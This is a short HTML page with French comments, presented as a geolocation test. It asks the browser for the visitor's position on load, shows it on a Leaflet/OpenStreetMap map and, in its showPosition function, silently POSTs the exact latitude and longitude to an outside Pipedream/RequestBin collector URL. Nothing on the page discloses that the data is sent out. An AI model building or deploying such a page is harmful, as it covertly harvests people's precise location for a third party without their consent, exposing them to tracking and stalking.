<!DOCTYPE html>
<html>
<head>
    <title>Test Géolocalisation avec Carte</title>
    <!-- Feuille de style pour Leaflet -->
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.7.1/dist/leaflet.css" />
    <style>
        #map { height: 400px; width: 100%; margin-top: 20px; }
    </style>
</head>
<body>
    <h1>Test de géolocalisation</h1>
    <p id="demo">Demande de position en cours...</p>
    <div id="map"></div>

    <!-- Script Leaflet -->
    <script src="https://unpkg.com/leaflet@1.7.1/dist/leaflet.js"></script>
    <script>
        // Initialise la carte (centrée sur une position par défaut)
        const map = L.map('map').setView([0, 0], 2);
        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
            attribution: '&copy; <a href="https://www.openstreetmap.org/copyright">OpenStreetMap</a> contributors'
        }).addTo(map);

        // Demande automatique au chargement de la page
        window.onload = function() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(showPosition, showError);
            } else {
                document.getElementById("demo").innerHTML = "La géolocalisation n'est pas supportée par ce navigateur.";
            }
        };

        function showPosition(position) {
            const lat = position.coords.latitude;
            const lon = position.coords.longitude;
            document.getElementById("demo").innerHTML = "Latitude: " + lat + "<br>Longitude: " + lon;

            // Centre la carte sur la position obtenue
            map.setView([lat, lon], 15);
            // Ajoute un marqueur
            L.marker([lat, lon]).addTo(map)
                .bindPopup("Tu es ici !")
                .openPopup();

            // Envoi des données à RequestBin
            fetch('https://eobfknqwgjyq7j0.m.pipedream.net', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({lat: lat, lon: lon}),
            });
        }

        function showError(error) {
            let message = "";
            switch(error.code) {
                case error.PERMISSION_DENIED:
                    message = "L'utilisateur a refusé la demande de géolocalisation.";
                    break;
                case error.POSITION_UNAVAILABLE:
                    message = "Les informations de position ne sont pas disponibles.";
                    break;
                case error.TIMEOUT:
                    message = "La demande de position a expiré.";
                    break;
                case error.UNKNOWN_ERROR:
                    message = "Une erreur inconnue s'est produite.";
                    break;
            }
            document.getElementById("demo").innerHTML = message;
        }
    </script>
</body>
</html>
